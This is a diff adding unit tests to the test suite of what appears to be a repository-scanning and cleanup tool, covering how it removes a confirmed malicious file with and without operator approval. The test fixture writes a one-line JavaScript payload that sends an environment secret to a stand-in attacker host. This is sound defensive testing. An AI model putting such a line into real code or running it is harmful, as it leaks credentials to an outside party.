@@ -1713,6 +1713,26 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         self.assertTrue(self._present(f"{self.base}:suspect.bin"),
                         "a resolver fault leaves the uncertain file in place")
 
+    def _unhandled_confirmed_file(self):
+        self.write(self.d, "steal.js", "fetch('https://evil.example/'+process.env.SECRET)\n")
+        self.commit(self.d, "add a confirmed payload saw cannot auto-clean")
+        return [Finding("exfil-secret", "exfil", Severity.CRITICAL, "steal.js",
+                        "exfiltrates an env secret", confidence=CONFIRMED)]
+
+    def test_the_operator_can_remove_a_confirmed_file_saw_could_not_auto_clean(self):
+        """A confirmed payload with no automatic remediation (would be needs-manual-recovery) is
+        removed when the operator says so, instead of the run refusing."""
+        outcome = self._run_with_findings(self._unhandled_confirmed_file(),
+                                          resolver=lambda item: Decision(remove=True))
+        self.assertTrue(outcome.completed, self._causes(outcome))
+        self.assertFalse(self._present(f"{self.base}:steal.js"), "the operator-removed file is gone")
+
+    def test_an_unhandled_confirmed_file_without_a_resolver_still_needs_manual_recovery(self):
+        outcome = self._run_with_findings(self._unhandled_confirmed_file(), resolver=None)
+        self.assertFalse(outcome.completed)
+        self.assertIn(Cause.PAYLOAD_NEEDS_MANUAL_RECOVERY, self._causes(outcome))
+        self.assertTrue(self._present(f"{self.base}:steal.js"))
+
     def test_the_payload_check_recreates_a_symlink_from_its_blob_not_as_text(self):
         """A write-redirect symlink is a git mode-120000 blob holding the target string. Read back as
         a regular file it is invisible to the symlink matcher, so the payload check would clear a path
